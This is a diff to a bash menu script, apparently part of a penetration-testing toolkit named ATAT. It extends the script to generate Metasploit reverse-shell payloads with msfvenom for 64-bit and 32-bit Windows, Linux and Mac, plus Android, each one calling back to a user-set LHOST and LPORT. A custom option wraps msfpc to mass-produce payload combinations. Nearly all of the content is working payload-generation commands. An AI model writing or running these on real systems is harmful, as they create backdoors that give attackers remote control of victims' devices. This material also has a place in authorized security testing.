@@ -220,29 +220,44 @@ case "$options" in
   # Accept upper or lowercase input.
   echo -e "\E[1;34m::::: \e[97mChoose Your Weapon \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
-options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 11=Main Menu | 12=QUIT: '
+options=("Windows 64" "Windows 32" "Linux 64" "Linux 32" "Mac 64" "Mac 32" "Android" "List_All" "Custom" "All The Payloads" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Windows")
+        "Windows 64")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
+            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell64.exe
+            echo -e "\E[1;34m::::: \e[97mshell64.exe saved to ~/ATAT/\E[1;34m:::::"
+            ;;
+        "Windows 32")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/ATAT/shell.exe
             echo -e "\E[1;34m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Linux")
+        "Linux 64")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
+            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/ATAT/shell64.elf
+            echo -e "\E[1;34m::::: \e[97mshell64.elf saved to ~/ATAT/\E[1;34m:::::"
+            ;;
+        "Linux 32")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/ATAT/shell.elf
             echo -e "\E[1;34m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;34m:::::"
             ;;
-        "Mac")
+        "Mac 64")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
+            msfvenom -p osx/x64/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/ATAT/shell64.macho
+            echo -e "\E[1;34m::::: \e[97mshell64.macho saved to ~/ATAT/\E[1;34m:::::"
+            ;;
+        "Mac 32")
+            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
+            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/ATAT/shell.macho
             echo -e "\E[1;34m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;34m:::::"
             ;;
         "Android")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
-            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
+            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/ATAT/shell.apk
             echo -e "\E[1;34m::::: \e[97mshell.apk saved to ~/ATAT/\E[1;34m:::::"
             ;;  
         "Custom")
@@ -264,7 +279,7 @@ cat << "EOF"
 
  Rather than putting <DOMAIN/IP>, you can input an interface and ATAT will detect that IP address. 
 EOF
-            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional): ' usermode
+            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional; loop=1 payload of each type | batch=every possible combination): ' usermode
             /usr/bin/msfpc $usertype $userhost $userport $usershell $userbindrev $userstage $userprotocol $usermode verbose
             echo -e "\E[1;34m::::: \e[97mPayload & RC File Saved to ~/ATAT/\E[1;34m:::::"
             ;;
